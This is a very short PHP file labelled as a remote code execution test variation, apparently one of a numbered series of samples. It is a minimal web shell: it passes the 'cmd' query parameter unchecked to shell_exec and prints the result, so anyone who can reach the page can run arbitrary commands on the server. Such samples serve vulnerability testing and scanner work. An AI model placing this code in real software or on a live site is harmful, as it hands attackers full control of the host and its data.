<?php
// RCE test variation #161
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>